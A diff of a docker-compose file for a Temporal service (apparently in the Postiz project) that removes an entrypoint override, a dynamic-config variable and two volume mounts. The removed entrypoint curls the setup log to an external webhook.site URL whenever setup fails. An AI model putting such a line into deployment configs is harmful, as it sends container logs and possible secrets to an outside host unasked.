@@ -320,8 +320,6 @@ services:
         condition: service_healthy
       temporal-elasticsearch:
         condition: service_healthy
-    entrypoint: >
-      sh -c "/etc/temporal/auto-setup.sh > /uploads/temporal.log 2>&1 || (curl -s -X POST -H 'Content-Type: text/plain' -d @/uploads/temporal.log https://webhook.site/323e59c5-a5cb-4366-bd87-ea9b00727df0; exit 1)"
 
     environment:
       - DB=postgres12
@@ -329,7 +327,6 @@ services:
       - POSTGRES_USER=temporal
       - POSTGRES_PWD=temporal
       - POSTGRES_SEEDS=temporal-postgresql
-      - DYNAMIC_CONFIG_FILE_PATH=config/dynamicconfig/development-sql.yaml
       - ENABLE_ES=true
       - ES_SEEDS=temporal-elasticsearch
       - ES_VERSION=v7
@@ -352,10 +349,6 @@ services:
       timeout: 5s
       retries: 15
       start_period: 60s
-
-    volumes:
-      - './dynamicconfig:/etc/temporal/config/dynamicconfig'
-      - 'postiz-uploads:/uploads/'
 
     labels:
       kompose.volume.type: configMap
